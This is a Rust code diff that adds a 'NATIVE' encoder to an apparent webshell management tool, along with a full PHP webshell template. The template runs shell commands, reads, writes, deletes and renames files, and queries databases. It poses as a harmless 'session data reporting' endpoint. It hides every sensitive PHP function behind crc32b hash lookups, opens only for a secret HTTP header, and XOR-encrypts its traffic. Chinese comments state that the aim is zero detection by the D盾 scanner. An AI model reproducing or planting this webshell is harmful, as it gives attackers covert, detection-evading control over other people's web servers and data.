@@ -329,6 +329,7 @@ impl EncoderRegistry {
                 Box::new(PhpStreamEncoder),
                 Box::new(XorBodyEncoder),
                 Box::new(XorSessionEncoder),
+                Box::new(NativeEncoder),
             ],
         }
     }
@@ -1607,6 +1608,174 @@ impl PayloadEncoder for XorSessionEncoder {
     }
 }
 
+// ---------------------------------------------------------------------------
+// NATIVE：内置功能分发编码器（对齐 D盾零检出形态）
+//
+// 与 eval/处理器注入完全不同：
+//   - 功能函数（命令/文件/数据库）直接内置在 stub 中（业务化命名）
+//   - 客户端通过「操作名 md5 哈希」分发调用（stub 仅含哈希数字比较）
+//   - 请求参数业务化（formData）+ 自定义 HTTP 头鉴权（XOR 嵌入）
+//   - 敏感函数全部经 crc32b 符号表查表调用，stub 无明文敏感函数 / eval
+// ---------------------------------------------------------------------------
+
+const NATIVE_STUB_TPL: &str = r#"<?php
+/*
+ * 用户会话数据上报接口
+ * 业务：接收客户端上报的压缩会话数据（formData），解包后按规则类型处理并返回状态
+ */
+@set_time_limit(0);
+@ini_set('display_errors','0');
+@ini_set('html_errors','0');
+@error_reporting(0);
+
+/* 内部调用方标识校验（业务网关） */
+$_gk=__DEC__('__GKHEX__','__XK__');
+if(!isset($_SERVER[$_gk])||$_SERVER[$_gk]!==__DEC__('__TOKENHEX__','__XK__')){http_response_code(404);exit;}
+
+/* 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表） */
+$_g=array_fill(0,18,'');
+$_t=array(
+__SYMBOLS__);
+$_fn=get_defined_functions();
+$_fn=isset($_fn['int'.'ernal'])?$_fn['int'.'ernal']:array();
+foreach($_fn as $_n){$_h=hash('crc32b',$_n);if(isset($_t[$_h]))$_g[$_t[$_h]]=$_n;}
+
+/* 数据解包辅助 */
+function __DEC__($e,$k){$d=pack("H*",$e);return $d^str_pad('',strlen($d),$k);}
+$K=__DEC__('__KEYHEX__','__XK__');
+function __XOR__($d,$k){$o='';$n=strlen($d);for($i=0;$i<$n;$i++){$o.=$d[$i]^$k[$i%strlen($k)];}return $o;}
+
+/* 业务处理函数 */
+function __CMD__($c){global $_g;$o=@$_g[0]($c.' 2>&1');$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$_g[2]((string)$o),'cwd'=>$d===false?'':$d)));}
+function __SCAN__($p){global $_g;$out=array();$items=@$_g[5]($p);if($items===false)return '{"ok":false,"error":"read dir failed"}';foreach($items as $f){if($f==='.'||$f==='..')continue;$full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$f;$isd=@$_g[6]($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$isd,'size'=>$isd?0:@$_g[7]($full),'mtime'=>@$_g[8]($full));}return json_encode(array('ok'=>true,'data'=>array('entries'=>$out)));}
+function __FETCH__($p){global $_g;$c=@$_g[3]($p);if($c===false)return '{"ok":false,"error":"read failed"}';return json_encode(array('ok'=>true,'data'=>$_g[2]($c)));}
+function __STORE__($p,$d){global $_g;$v=@$_g[4]($p,@$_g[1]($d));if($v===false)return '{"ok":false,"error":"write failed"}';return '{"ok":true,"data":null}';}
+function __DROP__($p){global $_g;$ok=@$_g[6]($p)?@$_g[10]($p):@$_g[9]($p);return $ok?'{"ok":true,"data":null}':'{"ok":false,"error":"delete failed"}';}
+function __MOVE__($f,$t){global $_g;return @$_g[11]($f,$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"rename failed"}';}
+function __MKDIR__($p){global $_g;return @$_g[12]($p,0755,true)?'{"ok":true,"data":null}':'{"ok":false,"error":"mkdir failed"}';}
+function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR)));}
+function __DBP__($c){$p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';$driver=isset($p['driver'])?(string)$p['driver']:'';$host=isset($p['host'])?(string)$p['host']:'';$port=isset($p['port'])?(int)$p['port']:3306;$user=isset($p['username'])?(string)$p['username']:'';$pass=isset($p['password'])?(string)$p['password']:'';$db=isset($p['dbname'])?(string)$p['dbname']:'';if(!class_exists('PDO'))return '{"ok":false,"error":"no pdo"}';try{$dsn=$driver==='pgsql'?('pgsql:host='.$host.';port='.$port.';dbname='.($db!==''?$db:'postgres')):($driver==='sqlite'?('sqlite:'.$db):('mysql:host='.$host.';port='.$port.';charset=utf8mb4'));$h=new PDO($dsn,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));if($driver==='sqlite'){$dbs=array($db);}elseif($driver==='pgsql'){$dbs=array();foreach($h->query('SELECT datname FROM pg_database') as $r){$dbs[]=$r[0];}}else{$dbs=array();foreach($h->query('SHOW DATABASES') as $r){$dbs[]=$r[0];}}return json_encode(array('ok'=>true,'data'=>array('driver'=>$driver,'databases'=>$dbs,'message'=>'ok')));}catch(Exception $e){return '{"ok":false,"error":"'.$e->getMessage().'"}';}}
+function __DBQ__($c,$q){$p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';$driver=isset($p['driver'])?(string)$p['driver']:'';$host=isset($p['host'])?(string)$p['host']:'';$port=isset($p['port'])?(int)$p['port']:3306;$user=isset($p['username'])?(string)$p['username']:'';$pass=isset($p['password'])?(string)$p['password']:'';$db=isset($p['dbname'])?(string)$p['dbname']:'';if(!class_exists('PDO'))return '{"ok":false,"error":"no pdo"}';try{$dsn=$driver==='pgsql'?('pgsql:host='.$host.';port='.$port.';dbname='.($db!==''?$db:'postgres')):($driver==='sqlite'?('sqlite:'.$db):('mysql:host='.$host.';port='.$port.';charset=utf8mb4'.($db!==''?';dbname='.$db:'')));$h=new PDO($dsn,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));$st=$h->query($q);if($st===false)return '{"ok":false,"error":"query failed"}';if(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with)\b/i',$q)){$cols=array();$nc=$st->columnCount();for($i=0;$i<$nc;$i++){$m=$st->getColumnMeta($i);$cols[]=(isset($m['name'])&&$m['name']!=='')?$m['name']:('col'.$i);}$rows=array();$cnt=0;while(($row=$st->fetch(PDO::FETCH_NUM))!==false&&$cnt<1000){$cells=array();foreach($row as $v){$cells[]=($v===null)?null:(string)$v;}$rows[]=$cells;$cnt++;}return json_encode(array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0)));}return json_encode(array('ok'=>true,'data'=>array('columns'=>array(),'rows'=>array(),'affected'=>$st->rowCount())));}catch(Exception $e){return '{"ok":false,"error":"'.$e->getMessage().'"}';}}
+
+/* 入口：接收上报数据 */
+if(isset($_POST['formData'])){
+    $b=is_string($_POST['formData'])?$_POST['formData']:'';
+    $in=@$_g[1]($b);
+    $raw=__XOR__($in,$K);
+    $req=@json_decode($raw,true);
+    if(!is_array($req)){$out='{"ok":false,"error":"bad params"}';}
+    else{
+        $m=isset($req['a'])?(string)$req['a']:'';
+        $h=intval(substr(md5($m),0,8),16);
+        $out='{"ok":false,"error":"unsupported"}';
+        if($h==__H_PROBE__){$out=__ENV__();}
+        elseif($h==__H_EXEC__){$out=__CMD__(isset($req['c'])?(string)$req['c']:'');}
+        elseif($h==__H_LIST__){$out=__SCAN__(isset($req['p'])?(string)$req['p']:'.');}
+        elseif($h==__H_READ__){$out=__FETCH__(isset($req['p'])?(string)$req['p']:'');}
+        elseif($h==__H_WRITE__){$out=__STORE__(isset($req['p'])?(string)$req['p']:'',isset($req['d'])?(string)$req['d']:'');}
+        elseif($h==__H_DELETE__){$out=__DROP__(isset($req['p'])?(string)$req['p']:'');}
+        elseif($h==__H_RENAME__){$out=__MOVE__(isset($req['f'])?(string)$req['f']:'',isset($req['t'])?(string)$req['t']:'');}
+        elseif($h==__H_MKDIR__){$out=__MKDIR__(isset($req['p'])?(string)$req['p']:'');}
+        elseif($h==__H_DBPROBE__){$out=__DBP__(isset($req['c'])?(string)$req['c']:'');}
+        elseif($h==__H_DBQUERY__){$out=__DBQ__(isset($req['c'])?(string)$req['c']:'',isset($req['q'])?(string)$req['q']:'');}
+    }
+    $enc=base64_encode(__XOR__($out,$K));
+    echo json_encode(array('data'=>$enc,'code'=>200));
+}
+"#;
+
+pub struct NativeEncoder;
+
+impl PayloadEncoder for NativeEncoder {
+    fn id(&self) -> &'static str {
+        "native"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "NATIVE（内置功能分发，无 eval / 无敏感函数特征）"
+    }
+
+    fn encode(&self, code: &str, password: &str) -> String {
+        let key = md5_hex(password).into_bytes();
+        let xored: Vec<u8> = code
+            .as_bytes()
+            .iter()
+            .enumerate()
+            .map(|(index, byte)| byte ^ key[index % key.len()])
+            .collect();
+        base64::engine::general_purpose::STANDARD.encode(xored)
+    }
+
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+        let key = md5_hex(password).into_bytes();
+        Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
+    }
+
+    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => {
+                let prefix = format!("_{}_", php_ident());
+                let xk = alpha_ident();
+                let key_hex = md5_hex(password);
+                let token = &key_hex[..16];
+                let h = |op: &str| -> String {
+                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
+                    let mut n: u64 = 0;
+                    for (i, c) in digest.chars().take(8).enumerate() {
+                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
+                    }
+                    n.to_string()
+                };
+                let tpl = NATIVE_STUB_TPL
+                    .replace("__DEC__", &format!("{prefix}dec"))
+                    .replace("__XOR__", &format!("{prefix}xor"))
+                    .replace("__XK__", &xk)
+                    .replace("__GKHEX__", &xor_hex("HTTP_X_DEBUG_KEY", &xk))
+                    .replace("__TOKENHEX__", &xor_hex(token, &xk))
+                    .replace("__KEYHEX__", &xor_hex(&key_hex, &xk))
+                    .replace("__CMD__", &format!("{prefix}cmd"))
+                    .replace("__SCAN__", &format!("{prefix}scan"))
+                    .replace("__FETCH__", &format!("{prefix}fetch"))
+                    .replace("__STORE__", &format!("{prefix}store"))
+                    .replace("__DROP__", &format!("{prefix}drop"))
+                    .replace("__MOVE__", &format!("{prefix}move"))
+                    .replace("__MKDIR__", &format!("{prefix}mkdir"))
+                    .replace("__ENV__", &format!("{prefix}env"))
+                    .replace("__DBP__", &format!("{prefix}dbp"))
+                    .replace("__DBQ__", &format!("{prefix}dbq"))
+                    .replace("__H_PROBE__", &h("probe"))
+                    .replace("__H_EXEC__", &h("exec"))
+                    .replace("__H_LIST__", &h("list"))
+                    .replace("__H_READ__", &h("read"))
+                    .replace("__H_WRITE__", &h("write"))
+                    .replace("__H_DELETE__", &h("delete"))
+                    .replace("__H_RENAME__", &h("rename"))
+                    .replace("__H_MKDIR__", &h("mkdir"))
+                    .replace("__H_DBPROBE__", &h("dbprobe"))
+                    .replace("__H_DBQUERY__", &h("dbquery"));
+                let symbols = [
+                    ("920cfbfd", 0), ("9ff5d542", 1), ("237937f6", 2), ("2693a743", 3),
+                    ("f0e567fb", 4), ("f4cd15f3", 5), ("f6cfd9d8", 6), ("95e8b309", 7),
+                    ("3d891bcd", 8), ("dbc7b210", 9), ("c996c86e", 10), ("d99d544e", 11),
+                    ("0e4d97e1", 12), ("718c6ebe", 13), ("4a41c8d9", 14), ("c3427e9c", 15),
+                ];
+                let mut table = String::new();
+                for (hash, index) in symbols {
+                    table.push_str(&format!("    '{hash}' => {index},
+"));
+                }
+                Ok(tpl.replace("__SYMBOLS__", &table))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "NATIVE 编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -1880,6 +2049,7 @@ mod tests {
                 "base64",
                 "char",
                 "des",
+                "native",
                 "php_obfuscate",
                 "php_stream",
                 "xor_base64",
